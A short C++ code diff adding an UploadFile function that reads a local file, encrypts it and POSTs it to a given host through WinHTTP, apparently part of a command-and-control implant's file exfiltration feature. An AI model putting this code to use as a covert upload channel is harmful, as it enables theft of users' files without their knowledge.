@@ -320,6 +320,39 @@ namespace System::Http
 		return TRUE;
 	}
 
+	BOOL UploadFile(
+        Procs::PPROCS pProcs,
+        HINTERNET hConnect,
+        LPCWSTR lpHost,
+        INTERNET_PORT nPort,
+        LPCWSTR lpPath,
+        LPCWSTR lpHeaders,
+        const std::wstring& wSrc
+    ) {
+        // Read a local file.
+        std::vector<char> byteData = System::Fs::ReadBytesFromFile(wSrc);
+        // Encrypt the data
+        std::string encData = Crypt::EncryptData(byteData);
+
+        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+            pProcs,
+            hConnect,
+            lpHost,
+            nPort,
+            lpPath,
+            L"POST",
+            lpHeaders,
+            (LPVOID)encData.c_str(),
+            (DWORD)strlen(encData.c_str())
+        );
+        if (!resp.bResult || resp.dwStatusCode != 200)
+        {
+            return FALSE;
+        }
+
+		return TRUE;
+	}
+
 	VOID WinHttpCloseHandles(
 		Procs::PPROCS pProcs,
 		HINTERNET hSession,
